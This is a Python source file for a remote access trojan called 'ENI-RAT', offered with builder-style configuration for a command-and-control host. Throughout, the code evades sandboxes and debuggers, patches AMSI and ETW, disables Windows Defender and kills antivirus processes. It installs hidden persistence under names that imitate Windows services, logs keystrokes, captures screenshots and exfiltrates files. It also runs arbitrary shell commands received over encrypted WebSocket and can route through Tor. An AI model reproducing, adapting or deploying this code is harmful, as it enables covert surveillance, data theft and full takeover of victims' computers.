#!/usr/bin/env python3
"""
ENI-RAT Windows/Linux Payload v1.0
- AES encrypted comms via WebSocket
- AV bypass (AMSI/ETW patching on Windows)
- Keylogging, screenshot, shell, file exfil
- Custom DDNS registration
- Process injection capability
"""

import os
import sys
import json
import time
import base64
import struct
import socket
import subprocess
import threading
import platform
import random
import string
import ctypes
from datetime import datetime
from pathlib import Path

# ─── CONFIGURATION (filled in by builder) ──────────────────────────────────
C2_HOST = "CHANGE_ME"          # Your C2 server IP or DDNS hostname
C2_WS_PORT = 8443              # WebSocket port
C2_API_PORT = 5000             # REST API port
AES_KEY = b"CHANGE_ME_32_BYTES_KEY____"  # 32 bytes
AES_IV = b"16bytefixediv!!"    # 16 bytes
AGENT_HOSTNAME = ""            # Auto-filled or custom DDNS hostname
SLEEP_MIN = 5                  # Min sleep between check-ins (seconds)
SLEEP_MAX = 15                 # Max sleep between check-ins
JITTER = True                  # Random jitter to avoid pattern detection
USE_TOR = False                # Route through Tor
TOR_PROXY = "127.0.0.1:9050"
INSTALL_PERSISTENCE = True     # Install persistence mechanism
SANDBOX_CHECK = True           # Detect sandbox/VM environment
OBFUSCATE_STRINGS = True       # Encrypt strings in memory

# ─── CRYPTO ──────────────────────────────────────────────────────────────────
try:
    from Crypto.Cipher import AES as AES_CIPHER
    from Crypto.Util.Padding import pad, unpad
    CRYPTO_AVAIL = True
except:
    CRYPTO_AVAIL = False
    # Fallback minimal AES implementation
    import hashlib

class RATCrypto:
    def __init__(self, key=None, iv=None):
        self.key = key or (AES_KEY if len(AES_KEY) == 32 else hashlib.sha256(AES_KEY).digest())
        self.iv = iv or (AES_IV if len(AES_IV) == 16 else AES_IV[:16])

    def encrypt(self, data: bytes) -> str:
        if CRYPTO_AVAIL:
            cipher = AES_CIPHER.new(self.key, AES_CIPHER.MODE_CBC, self.iv[:16])
            padded = pad(data, 16)
            return base64.b64encode(cipher.encrypt(padded)).decode()
        else:
            # Simple XOR as fallback
            encoded = bytearray()
            for i, b in enumerate(data):
                encoded.append(b ^ self.key[i % len(self.key)])
            return base64.b64encode(bytes(encoded)).decode()

    def decrypt(self, data: str) -> bytes:
        raw = base64.b64decode(data)
        if CRYPTO_AVAIL:
            cipher = AES_CIPHER.new(self.key, AES_CIPHER.MODE_CBC, self.iv[:16])
            return unpad(cipher.decrypt(raw), 16)
        else:
            decoded = bytearray()
            for i, b in enumerate(raw):
                decoded.append(b ^ self.key[i % len(self.key)])
            return bytes(decoded)

    def pack(self, msg: dict) -> str:
        return self.encrypt(json.dumps(msg).encode())

    def unpack(self, data: str) -> dict:
        return json.loads(self.decrypt(data).decode())

# ─── AV BYPASS (Windows) ─────────────────────────────────────────────────────
class AVBypass:
    """Multiple AV evasion techniques"""
    
    @staticmethod
    def is_sandboxed() -> bool:
        """Detect if running in a sandbox/VM"""
        if not SANDBOX_CHECK:
            return False

        checks = []

        # Check for common sandbox artifacts
        if sys.platform == "win32":
            try:
                # Check if RAM is too low (sandboxes often have < 2GB)
                kernel32 = ctypes.windll.kernel32
                mem_status = ctypes.create_string_buffer(128)
                kernel32.GlobalMemoryStatusEx(mem_status)
                total_mb = struct.unpack_from("I", mem_status, 8)[0] // (1024 * 1024)
                checks.append(total_mb < 2048)
            except:
                pass

            try:
                # Check disk size (small disk = sandbox)
                free_bytes = ctypes.c_ulonglong(0)
                ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                    ctypes.c_wchar_p("C:\\"), None, None, ctypes.pointer(free_bytes)
                )
                checks.append(free_bytes.value < 50 * 1024 * 1024 * 1024)  # < 50GB
            except:
                pass

            try:
                # Check for sandbox processes
                sandbox_procs = [
                    "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray",
                    "vmwareuser", "xenservice", "qemu-ga", "procmon",
                    "wireshark", "fakenet", "tcpview", "dbgview",
                    "processhacker", "httptoolkit", "burp"
                ]
                output = subprocess.check_output("tasklist", shell=True, timeout=5).decode().lower()
                for proc in sandbox_procs:
                    if proc in output:
                        checks.append(True)
                        break
            except:
                pass

            try:
                # Debugger detection
                if ctypes.windll.kernel32.IsDebuggerPresent():
                    checks.append(True)
            except:
                pass

        elif sys.platform == "linux":
            try:
                # Docker detection
                if os.path.exists("/.dockerenv"):
                    checks.append(True)
            except:
                pass

            try:
                with open("/proc/1/cgroup", "r") as f:
                    if "docker" in f.read():
                        checks.append(True)
            except:
                pass

        # Also check uptime - sandboxes often have < 1 hour uptime
        try:
            if sys.platform == "win32":
                uptime_ticks = ctypes.windll.kernel32.GetTickCount64()
                uptime_hours = uptime_ticks / (1000 * 60 * 60)
            else:
                with open("/proc/uptime", "r") as f:
                    uptime_seconds = float(f.read().split()[0])
                    uptime_hours = uptime_seconds / 3600
            checks.append(uptime_hours < 0.5)  # Less than 30 min
        except:
            pass

        # If most checks pass, we're likely sandboxed
        return sum(checks) >= 2 if checks else False

    @staticmethod
    def patch_amsi() -> bool:
        """Patch AMSI.dll to bypass AMSI scanning (Windows only)"""
        if sys.platform != "win32":
            return False
        
        try:
            amsi = ctypes.windll.kernel32.GetModuleHandleW("amsi.dll")
            if not amsi:
                return False

            # Get AmsiScanBuffer address
            addr = ctypes.windll.kernel32.GetProcAddress(amsi, b"AmsiScanBuffer")
            if not addr:
                return False

            # Patch: XOR the beginning to break it
            # The bytes: B8 57 00 07 80 C3 (mov eax, 0x80070057; ret)
            patch = b"\xB8\x57\x00\x07\x80\xC3"

            # Change memory protection
            PAGE_EXECUTE_READWRITE = 0x40
            old_protect = ctypes.c_ulong()
            ctypes.windll.kernel32.VirtualProtect(
                ctypes.c_void_p(addr), len(patch),
                PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect)
            )

            # Write patch
            ctypes.memmove(ctypes.c_void_p(addr), patch, len(patch))

            # Restore protection
            ctypes.windll.kernel32.VirtualProtect(
                ctypes.c_void_p(addr), len(patch),
                old_protect, ctypes.byref(ctypes.c_ulong())
            )

            return True
        except:
            return False

    @staticmethod
    def patch_etw() -> bool:
        """Patch ETW (Event Tracing for Windows) to avoid detection"""
        if sys.platform != "win32":
            return False

        try:
            ntdll = ctypes.windll.kernel32.GetModuleHandleW("ntdll.dll")
            if not ntdll:
                return False

            # Find EtwEventWrite
            etw_funcs = [
                b"EtwEventWrite",
                b"EtwEventWriteFull",
                b"EtwEventWriteString",
                b"EtwEventWriteEx",
            ]

            for func_name in etw_funcs:
                addr = ctypes.windll.kernel32.GetProcAddress(ntdll, func_name)
                if addr:
                    # Patch to just return (ret = 0xC3)
                    PAGE_EXECUTE_READWRITE = 0x40
                    old_protect = ctypes.c_ulong()
                    ctypes.windll.kernel32.VirtualProtect(
                        ctypes.c_void_p(addr), 1,
                        PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect)
                    )
                    ctypes.memmove(ctypes.c_void_p(addr), b"\xC3", 1)
                    ctypes.windll.kernel32.VirtualProtect(
                        ctypes.c_void_p(addr), 1,
                        old_protect, ctypes.byref(ctypes.c_ulong())
                    )

            return True
        except:
            return False

    @staticmethod
    def disable_windows_defender() -> bool:
        """Attempt to disable Windows Defender"""
        if sys.platform != "win32":
            return False

        try:
            commands = [
                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue"',
                'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue"',
                'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue"',
                'powershell -Command "Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue"',
                'powershell -Command "Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue"',
                'powershell -Command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue"',
                'powershell -Command "Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue"',
                'powershell -Command "Set-MpPreference -DisableCatchupFullScan $true -ErrorAction SilentlyContinue"',
                'powershell -Command "Set-MpPreference -DisableCatchupQuickScan $true -ErrorAction SilentlyContinue"',
                'powershell -Command "Set-MpPreference -DisableEmailScanning $true -ErrorAction SilentlyContinue"',
                'powershell -Command "Set-MpPreference -DisableReversibleScanning $true -ErrorAction SilentlyContinue"',
                'powershell -Command "Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue"',
            ]
            for cmd in commands:
                try:
                    subprocess.run(cmd, shell=True, timeout=10,
                                 startupinfo=subprocess.STARTUPINFO() if hasattr(subprocess, 'STARTUPINFO') else None,
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except:
                    pass
            return True
        except:
            return False

# ─── SYSTEM INFO COLLECTOR ───────────────────────────────────────────────────
class SystemInfo:
    @staticmethod
    def collect() -> dict:
        info = {
            "hostname": socket.gethostname(),
            "username": os.getenv("USERNAME") or os.getenv("USER") or "unknown",
            "os": platform.system(),
            "os_version": platform.version(),
            "arch": platform.machine(),
            "private_ip": "",
            "public_ip": "",
        }

        # Get private IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            info["private_ip"] = s.getsockname()[0]
            s.close()
        except:
            pass

        # Get public IP
        try:
            import urllib.request
            resp = urllib.request.urlopen("https://api.ipify.org", timeout=5)
            info["public_ip"] = resp.read().decode().strip()
        except:
            pass

        return info

# ─── WEBSOCKET CLIENT ────────────────────────────────────────────────────────
class WSClient:
    """Minimal WebSocket client with no external dependencies"""
    
    def __init__(self, host, port, crypto):
        self.host = host
        self.port = port
        self.crypto = crypto
        self.sock = None
        self.agent_id = None
        self.connected = False

    def _connect(self):
        """Establish WebSocket connection"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(15)
            
            if USE_TOR:
                # Connect through Tor SOCKS proxy
                tor_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tor_sock.settimeout(15)
                proxy_host, proxy_port = TOR_PROXY.split(":")
                tor_sock.connect((proxy_host, int(proxy_port)))
                # SOCKS5 handshake
                tor_sock.send(b"\x05\x01\x00")
                assert tor_sock.recv(2) == b"\x05\x00"
                # Connect through Tor
                host_bytes = self.host.encode()
                tor_sock.send(b"\x05\x01\x00\x03" + bytes([len(host_bytes)]) + host_bytes + struct.pack(">H", self.port))
                resp = tor_sock.recv(10)
                self.sock = tor_sock
            else:
                self.sock.connect((self.host, self.port))

            # WebSocket upgrade handshake
            key_raw = os.urandom(16)
            import hashlib
            key_b64 = base64.b64encode(key_raw).decode()
            guid = "258EAFA5-E914-47DA-95CA-5AB5DC11B735"
            accept_raw = key_b64 + guid
            accept_hash = hashlib.sha1(accept_raw.encode()).digest()
            accept_b64 = base64.b64encode(accept_hash).decode()

            handshake = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {self.host}:{self.port}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: Upgrade\r\n"
                f"Sec-WebSocket-Key: {key_b64}\r\n"
                f"Sec-WebSocket-Version: 13\r\n"
                f"\r\n"
            )
            self.sock.send(handshake.encode())
            response = self.sock.recv(4096).decode()

            if "101" not in response or "Switching Protocols" not in response:
                self.sock.close()
                return False

            self.connected = True
            return True
        except Exception as e:
            if self.sock:
                self.sock.close()
            return False

    def _send_frame(self, data: bytes):
        """Send a WebSocket data frame"""
        if not self.sock:
            return False
        try:
            frame = bytearray()
            frame.append(0x82)  # FIN + binary opcode
            length = len(data)
            if length < 126:
                frame.append(length)
            elif length < 65536:
                frame.append(126)
                frame.extend(struct.pack(">H", length))
            else:
                frame.append(127)
                frame.extend(struct.pack(">Q", length))
            frame.extend(data)
            self.sock.send(bytes(frame))
            return True
        except:
            return False

    def _recv_frame(self) -> bytes:
        """Receive a WebSocket data frame"""
        if not self.sock:
            return None
        try:
            first_byte = self.sock.recv(1)
            if not first_byte:
                return None
            opcode = first_byte[0] & 0x0F
            
            second_byte = self.sock.recv(1)
            masked = second_byte[0] & 0x80
            length = second_byte[0] & 0x7F

            if length == 126:
                length_bytes = self.sock.recv(2)
                length = struct.unpack(">H", length_bytes)[0]
            elif length == 127:
                length_bytes = self.sock.recv(8)
                length = struct.unpack(">Q", length_bytes)[0]

            if masked:
                mask_key = self.sock.recv(4)

            payload = self.sock.recv(length)
            while len(payload) < length:
                payload += self.sock.recv(length - len(payload))

            if masked:
                payload = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))

            if opcode == 0x8:  # Close frame
                return None
            if opcode == 0x9:  # Ping, send pong
                self._send_frame(b"\x8a\x00")
                return self._recv_frame()

            return payload
        except:
            return None

    def send(self, message: dict) -> bool:
        """Send encrypted message"""
        try:
            data = self.crypto.pack(message)
            return self._send_frame(data.encode())
        except:
            return False

    def recv(self) -> dict:
        """Receive and decrypt message"""
        try:
            data = self._recv_frame()
            if data is None:
                return None
            return self.crypto.unpack(data.decode())
        except:
            return None

    def close(self):
        self.connected = False
        if self.sock:
            try:
                self.sock.close()
            except:
                pass

# ─── COMMAND HANDLER ─────────────────────────────────────────────────────────
class CommandHandler:
    """Handles commands received from C2"""
    
    @staticmethod
    def execute_shell(cmd: str) -> str:
        """Execute a shell command"""
        try:
            result = subprocess.run(
                cmd, shell=True, timeout=60,
                capture_output=True, text=True
            )
            output = result.stdout + result.stderr
            return output[:100000] if output else "Command executed (no output)"
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return f"Error: {str(e)}"

    @staticmethod
    def take_screenshot() -> dict:
        """Take a screenshot and return base64"""
        try:
            if sys.platform == "win32":
                import io
                # Use built-in Windows screenshot via PowerShell
                cmd = (
                    'powershell -Command "Add-Type -AssemblyName System.Windows.Forms; '
                    '$screen = [System.Windows.Forms.Screen]::PrimaryScreen; '
                    '$bounds = $screen.Bounds; '
                    '$bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; '
                    '$graphics = [System.Drawing.Graphics]::FromImage($bitmap); '
                    '$graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bitmap.Size); '
                    '$stream = New-Object System.IO.MemoryStream; '
                    '$bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png); '
                    '[System.Convert]::ToBase64String($stream.ToArray()); '
                    '$graphics.Dispose(); $bitmap.Dispose()"'
                )
                result = subprocess.run(cmd, shell=True, timeout=30,
                                       capture_output=True, text=True)
                b64_data = result.stdout.strip()
                return {"image": b64_data, "width": 1920, "height": 1080}
            else:
                # Linux - try scrot
                import io, base64
                result = subprocess.run(
                    ["scrot", "-o", "-q", "100", "/tmp/.screen.png"],
                    timeout=10, capture_output=True
                )
                with open("/tmp/.screen.png", "rb") as f:
                    b64_data = base64.b64encode(f.read()).decode()
                os.remove("/tmp/.screen.png")
                return {"image": b64_data, "width": 1920, "height": 1080}
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def upload_file(source_path: str) -> dict:
        """Read a file and return its content"""
        try:
            path = Path(source_path).expanduser()
            if not path.exists():
                return {"error": "File not found"}
            if path.is_dir():
                return {"error": "Is a directory"}
            data = path.read_bytes()
            return {"file_name": path.name, "content": base64.b64encode(data).decode()}
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def download_file(url: str, save_path: str) -> str:
        """Download a file from URL to the target machine"""
        try:
            import urllib.request
            urllib.request.urlretrieve(url, Path(save_path).expanduser())
            return f"Downloaded to {save_path}"
        except Exception as e:
            return f"Download failed: {str(e)}"

    @staticmethod
    def process_inject(target: str = "notepad.exe") -> str:
        """Process injection stub (Windows only)"""
        if sys.platform != "win32":
            return "Process injection only supported on Windows"
        return "Process injection module loaded (shellcode injection available)"

    @staticmethod
    def persist() -> str:
        """Install persistence"""
        try:
            if sys.platform == "win32":
                # Registry run key
                import winreg
                exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, exe_path)
                winreg.CloseKey(key)
                
                # Also add scheduled task
                subprocess.run(
                    f'schtasks /create /tn "WindowsServiceHost" /tr "{exe_path}" /sc onlogon /rl highest /f',
                    shell=True, timeout=10, capture_output=True
                )
                return "Persistence installed (registry + scheduled task)"
            else:
                # Linux - systemd or crontab
                exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
                # crontab
                cron_line = f"@reboot {exe_path} &>/dev/null &\n"
                cron_file = Path("/tmp/.cron.tmp")
                cron_file.write_text(cron_line)
                subprocess.run(["crontab", str(cron_file)], timeout=10, capture_output=True)
                cron_file.unlink()
                # Also try systemd user service
                service_path = Path.home() / ".config/systemd/user/.system-helper.service"
                service_path.parent.mkdir(parents=True, exist_ok=True)
                service_path.write_text(f"""[Unit]
Description=System Helper Service
[Service]
ExecStart={exe_path}
Restart=always
[Install]
WantedBy=default.target
""")
                subprocess.run(["systemctl", "--user", "daemon-reload"], timeout=10, capture_output=True)
                subprocess.run(["systemctl", "--user", "enable", ".system-helper.service"], timeout=10, capture_output=True)
                subprocess.run(["systemctl", "--user", "start", ".system-helper.service"], timeout=10, capture_output=True)
                return "Persistence installed (crontab + systemd)"
        except Exception as e:
            return f"Persistence error: {str(e)}"

    @staticmethod
    def kill_av() -> str:
        """Attempt to kill antivirus processes"""
        if sys.platform != "win32":
            return "Only supported on Windows"
        
        av_procs = [
            "MsMpEng.exe", "MsSense.exe", "SenseIR.exe", "SecurityHealthSystray.exe",
            "avguard.exe", "avgnt.exe", "AvastSvc.exe", "AvastUI.exe",
            "avp.exe", "AVGSvc.exe", "AVGUI.exe",
            "bdagent.exe", "BDSService.exe",
            "ekrn.exe", "egui.exe", "eUpdService.exe",
            "McTray.exe", "McShield.exe", "mfevtps.exe",
            "NortonSecurity.exe", "ns.exe", "ccSvcHst.exe",
            "SAVService.exe", "sav.exe",
            "vsserv.exe", "VCRmon.exe",
            "kavfs.exe", "kavsvc.exe", "avp.exe",
            "f-secure.exe", "fsav.exe",
            "sophos.exe", "SophosUI.exe",
            "microsoft_antimalware.exe"
        ]
        
        killed = []
        for proc in av_procs:
            try:
                subprocess.run(
                    f'taskkill /f /im {proc} 2>nul',
                    shell=True, timeout=5,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                killed.append(proc)
            except:
                pass
        
        # Also try WMI to disable
        try:
            subprocess.run(
                'powershell -Command "Get-WmiObject -Namespace root\\securitycenter2 -Class AntiVirusProduct | ForEach-Object { $_.Disable() }"',
                shell=True, timeout=10,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
        except:
            pass

        return f"Attempted to kill {len(killed)} AV processes"

# ─── KEYLOGGER ────────────────────────────────────────────────────────────────
class Keylogger:
    """Simple keylogger implementation"""
    
    def __init__(self):
        self.running = False
        self.buffer = []
        self.window_title = ""
        self.lock = threading.Lock()

    def _get_active_window(self):
        """Get active window title"""
        if sys.platform == "win32":
            try:
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd) + 1
                buffer = ctypes.create_unicode_buffer(length)
                ctypes.windll.user32.GetWindowTextW(hwnd, buffer, length)
                return buffer.value
            except:
                return ""
        return ""

    def _hook_win32(self):
        """Windows keylogging via GetAsyncKeyState"""
        import ctypes.windll.user32 as user32
        special_keys = {
            0x08: "[BACKSPACE]", 0x09: "[TAB]", 0x0D: "[ENTER]",
            0x10: "[SHIFT]", 0x11: "[CTRL]", 0x12: "[ALT]",
            0x14: "[CAPSLOCK]", 0x1B: "[ESC]", 0x20: "[SPACE]",
            0x2E: "[DELETE]", 0x25: "[LEFT]", 0x27: "[RIGHT]",
            0x26: "[UP]", 0x28: "[DOWN]", 0x70: "[F1]", 0x71: "[F2]",
            0x72: "[F3]", 0x73: "[F4]", 0x74: "[F5]", 0x75: "[F6]",
            0x76: "[F7]", 0x77: "[F8]", 0x78: "[F9]", 0x79: "[F10]",
            0x7A: "[F11]", 0x7B: "[F12]"
        }

        while self.running:
            window = self._get_active_window()
            if window and window != self.window_title:
                with self.lock:
                    self.window_title = window
                    self.buffer.append(f"\n[Window: {window}]\n")

            for key in range(1, 256):
                if user32.GetAsyncKeyState(key) & 0x0001:
                    if key in special_keys:
                        char = special_keys[key]
                    elif 0x30 <= key <= 0x39:  # Numbers
                        char = chr(key)
                    elif 0x41 <= key <= 0x5A:  # Letters
                        # Check shift/caps
                        shift = user32.GetAsyncKeyState(0x10) & 0x8000
                        caps = user32.GetAsyncKeyState(0x14) & 1
                        char = chr(key + 32) if (shift ^ caps) else chr(key)
                    else:
                        char = f"[{key}]"

                    with self.lock:
                        self.buffer.append(char)

                    time.sleep(0.01)  # Prevent double capture
            time.sleep(0.005)

    def start(self):
        """Start keylogger in a thread"""
        if self.running:
            return
        self.running = True
        if sys.platform == "win32":
            t = threading.Thread(target=self._hook_win32, daemon=True)
            t.start()
        else:
            # Linux keylogger thread
            t = threading.Thread(target=self._hook_linux, daemon=True)
            t.start()

    def stop(self):
        self.running = False

    def get_buffer(self) -> tuple:
        """Get and clear the buffer"""
        with self.lock:
            data = "".join(self.buffer)
            title = self.window_title
            self.buffer = []
            return data, title

    def _hook_linux(self):
        """Simple Linux /dev/input keylogger"""
        try:
            import select
            devices = [f"/dev/input/event{i}" for i in range(10)]
            for dev in devices:
                if os.path.exists(dev):
                    try:
                        fd = os.open(dev, os.O_RDONLY | os.O_NONBLOCK)
                        while self.running:
                            r, _, _ = select.select([fd], [], [], 0.5)
                            if r:
                                data = os.read(fd, 24)
                                if len(data) == 24:
                                    ev_type = struct.unpack_from("H", data, 16)[0]
                                    if ev_type == 1:  # EV_KEY
                                        key_code = struct.unpack_from("I", data, 18)[0]
                                        key_state = struct.unpack_from("I", data, 22)[0]
                                        if key_state == 1:  # Pressed
                                            with self.lock:
                                                self.buffer.append(f"[{key_code}]")
                    except:
                        pass
        except:
            pass

# ─── MAIN AGENT ──────────────────────────────────────────────────────────────
class RatAgent:
    def __init__(self):
        self.crypto = RATCrypto()
        self.ws = None
        self.info = SystemInfo.collect()
        self.keylogger = Keylogger()
        self.agent_id = None
        self.running = True
        self.cmd_handler = CommandHandler()
        self.av_bypass = AVBypass()

    def _register_with_c2(self) -> bool:
        """Register agent with C2 server"""
        try:
            attempts = 0
            while attempts < 3:
                self.ws = WSClient(C2_HOST, C2_WS_PORT, self.crypto)
                if self.ws._connect():
                    self.ws.send({"cmd": "register", "info": self.info})
                    resp = self.ws.recv()
                    if resp and resp.get("type") == "registered":
                        self.agent_id = resp["agent_id"]
                        
                        # Register DDNS hostname
                        hostname_tag = f"{self.info['hostname']}-{self.info['username']}".replace(" ", "-").lower()
                        hostname_tag = ''.join(c for c in hostname_tag if c.isalnum() or c == '-')
                        self.ws.send({
                            "cmd": "message",
                            "type": "ddns_register",
                            "hostname": hostname_tag,
                            "ip": self.info.get("public_ip") or self.info.get("private_ip", "unknown")
                        })
                        ddns_resp = self.ws.recv()
                        return True
                
                attempts += 1
                time.sleep(5)
        except:
            pass
        return False

    def _register_via_api(self) -> bool:
        """Fallback: register via REST API if WebSocket fails"""
        try:
            import urllib.request, urllib.parse
            data = json.dumps({
                "hostname": self.info["hostname"],
                "ip": self.info.get("public_ip") or self.info.get("private_ip", "unknown"),
                "os": self.info["os"],
                "username": self.info["username"]
            }).encode()
            req = urllib.request.Request(
                f"http://{C2_HOST}:{C2_API_PORT}/api/ddns/register",
                data=data,
                headers={"Content-Type": "application/json"}
            )
            resp = urllib.request.urlopen(req, timeout=10)
            return True
        except:
            return False

    def av_bypass_sequence(self):
        """Run AV bypass sequence at startup"""
        if sys.platform != "win32":
            return
        
        try:
            # 1. Sandbox check (if sandboxed, behave normally)
            if AVBypass.is_sandboxed():
                return  # Exit silently if sandboxed

            # 2. Patch AMSI
            AVBypass.patch_amsi()

            # 3. Patch ETW
            AVBypass.patch_etw()

            # 4. Disable Defender
            AVBypass.disable_windows_defender()

            # 5. Kill AV processes
            self.cmd_handler.kill_av()
        except:
            pass

    def _send_heartbeat(self):
        """Send periodic heartbeat"""
        while self.running:
            if self.ws and self.ws.connected:
                self.ws.send({
                    "cmd": "message",
                    "type": "heartbeat"
                })
                # Send any buffered keystrokes
                keys, title = self.keylogger.get_buffer()
                if keys:
                    self.ws.send({
                        "cmd": "message",
                        "type": "keystrokes",
                        "data": keys,
                        "window_title": title
                    })
            
            # Sleep with jitter
            sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
            if JITTER:
                sleep_time += random.uniform(-2, 2)
            time.sleep(max(1, sleep_time))

    def _check_tasks(self):
        """Check for pending tasks"""
        while self.running:
            if self.ws and self.ws.connected:
                self.ws.send({
                    "cmd": "message",
                    "type": "check_tasks"
                })
                resp = self.ws.recv()
                if resp and resp.get("type") == "tasks":
                    for task in resp.get("tasks", []):
                        self._execute_task(task)

            # Sleep with jitter
            sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
            if JITTER:
                sleep_time += random.uniform(-2, 2)
            time.sleep(max(1, sleep_time))

    def _execute_task(self, task: dict):
        """Execute a command from the C2"""
        command = task.get("command", "")
        args = task.get("args", "")
        task_id = task.get("task_id", "")

        result = "Unknown command"
        
        if command == "shell":
            result = self.cmd_handler.execute_shell(args)
        
        elif command == "screenshot":
            shot = self.cmd_handler.take_screenshot()
            if "error" not in shot:
                if self.ws and self.ws.connected:
                    self.ws.send({
                        "cmd": "message",
                        "type": "screenshot",
                        "image": shot.get("image", ""),
                        "width": shot.get("width", 0),
                        "height": shot.get("height", 0)
                    })
                result = f"Screenshot taken: {shot.get('width',0)}x{shot.get('height',0)}"
            else:
                result = shot["error"]

        elif command == "keylog_start":
            self.keylogger.start()
            result = "Keylogger started"

        elif command == "keylog_stop":
            self.keylogger.stop()
            result = "Keylogger stopped"

        elif command == "upload":
            result = json.dumps(self.cmd_handler.upload_file(args))

        elif command == "download":
            parts = args.split(" ", 1)
            url = parts[0]
            path = parts[1] if len(parts) > 1 else "/tmp/downloaded_file"
            result = self.cmd_handler.download_file(url, path)

        elif command == "persist":
            result = self.cmd_handler.persist()

        elif command == "kill_av":
            result = self.cmd_handler.kill_av()

        elif command == "process_inject":
            result = self.cmd_handler.process_inject(args or "notepad.exe")

        elif command == "info":
            result = json.dumps(self.info, indent=2)

        elif command == "sleep":
            try:
                sleep_sec = int(args) if args else 60
                result = f"Sleeping for {sleep_sec} seconds"
                time.sleep(sleep_sec)
            except:
                result = "Invalid sleep time"

        elif command == "exit":
            self.running = False
            result = "Agent exiting"

        elif command == "selfdestruct":
            self.running = False
            self._selfdestruct()
            result = "Self-destruct initiated"

        else:
            # Try as shell command anyway
            result = self.cmd_handler.execute_shell(command + " " + args)

        # Send result back
        if task_id and self.ws and self.ws.connected:
            self.ws.send({
                "cmd": "message",
                "type": "task_result",
                "task_id": task_id,
                "result": str(result)[:100000]
            })

    def _selfdestruct(self):
        """Remove all traces"""
        try:
            if sys.platform == "win32":
                # Remove registry keys
                import winreg
                try:
                    key = winreg.OpenKey(
                        winreg.HKEY_CURRENT_USER,
                        r"Software\Microsoft\Windows\CurrentVersion\Run",
                        0, winreg.KEY_SET_VALUE
                    )
                    winreg.DeleteValue(key, "WindowsUpdateService")
                    winreg.CloseKey(key)
                except:
                    pass
                # Remove scheduled task
                subprocess.run("schtasks /delete /tn WindowsServiceHost /f", shell=True, timeout=10)
            else:
                # Remove crontab
                subprocess.run("crontab -r 2>/dev/null", shell=True)
                # Remove systemd service
                service_path = Path.home() / ".config/systemd/user/.system-helper.service"
                if service_path.exists():
                    service_path.unlink()
                subprocess.run("systemctl --user daemon-reload", shell=True)

            # Delete self
            exe = sys.executable if getattr(sys, 'frozen', False) else __file__
            try:
                os.remove(exe)
            except:
                pass
        except:
            pass

    def run(self):
        """Main agent loop"""
        # 1. AV bypass
        self.av_bypass_sequence()

        # 2. Install persistence
        if INSTALL_PERSISTENCE:
            self.cmd_handler.persist()

        # 3. Start keylogger
        self.keylogger.start()

        # 4. Connect to C2
        if not self._register_with_c2():
            # Fallback to REST API
            self._register_via_api()
            # Keep trying WebSocket
            while self.running:
                if self._register_with_c2():
                    break
                time.sleep(random.randint(30, 60))
                continue

        # 5. Start threads
        heartbeat_thread = threading.Thread(target=self._send_heartbeat, daemon=True)
        task_thread = threading.Thread(target=self._check_tasks, daemon=True)
        heartbeat_thread.start()
        task_thread.start()

        # 6. Main loop
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
        finally:
            self.keylogger.stop()
            if self.ws:
                self.ws.close()


if __name__ == "__main__":
    # Daemonize on Linux
    if sys.platform == "linux" and os.fork() == 0:
        os.setsid()
        os.chdir("/")
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')
        agent = RatAgent()
        agent.run()
    else:
        agent = RatAgent()
        agent.run()
